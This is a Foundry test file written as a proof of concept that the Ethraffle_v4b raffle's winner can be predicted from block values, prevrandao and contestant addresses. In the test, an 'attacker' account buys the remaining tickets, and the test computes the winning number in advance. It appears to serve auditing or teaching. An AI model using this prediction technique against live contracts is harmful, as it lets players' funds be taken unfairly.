
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Ethraffle_v4b} from "../src/Ethraffle_v4b.sol";

contract TestWeakRandomnessEthraffle_v4b is Test {
    Ethraffle_v4b public raffle;

    address public attacker = address(0xA11CE);
    address public other1 = address(0xBEEF1);
    address public other2 = address(0xBEEF2);

    function setUp() public {
        vm.deal(attacker, 100 ether);
        vm.deal(other1, 100 ether);
        vm.deal(other2, 100 ether);

        raffle = new Ethraffle_v4b();
    }

    function test_highlightPredictableRandomValue(
        uint256 blockNumber,
        uint256 blockPrevrandao,
        address blockCoinbase
    ) public {
        vm.assume(blockNumber > block.number);
        vm.assume(blockNumber < type(uint256).max / 2);
        vm.assume(blockPrevrandao > 0 && blockPrevrandao < type(uint256).max / 2);
        vm.assume(blockCoinbase != address(0));

        vm.roll(blockNumber);
        vm.difficulty(blockPrevrandao);
        vm.coinbase(blockCoinbase);

        uint256 pricePerTicket = raffle.pricePerTicket();
        uint256 totalTickets = raffle.totalTickets();

        vm.startPrank(other1);
        vm.deal(other1, 100 ether);
        raffle.buyTickets{value: pricePerTicket * 10}();
        vm.stopPrank();

        vm.startPrank(other2);
        vm.deal(other2, 100 ether);
        raffle.buyTickets{value: pricePerTicket * 10}();
        vm.stopPrank();

        vm.startPrank(attacker);
        vm.deal(attacker, 100 ether);
        raffle.buyTickets{value: pricePerTicket * (totalTickets - 20)}();
        vm.stopPrank();

        Ethraffle_v4b.Contestant memory c1 = raffle.contestants(
            uint(uint160(address(block.coinbase))) % totalTickets
        );
        Ethraffle_v4b.Contestant memory c2 = raffle.contestants(
            uint(uint160(address(attacker))) % totalTickets
        );

        address seed1 = c1.addr;
        address seed2 = c2.addr;
        uint256 seed3 = blockPrevrandao;
        bytes32 randHash = keccak256(abi.encodePacked(seed1, seed2, seed3));
        uint256 expectedWinningNumber = uint256(randHash) % totalTickets;

        vm.expectEmit(true, true, true, true);
        emit Ethraffle_v4b.RaffleResult(
            raffle.raffleId(),
            expectedWinningNumber,
            raffle.contestants(expectedWinningNumber).addr,
            seed1,
            seed2,
            seed3,
            randHash
        );

        vm.startPrank(attacker);
        raffle.buyTickets{value: 0}();
        vm.stopPrank();
    }
}
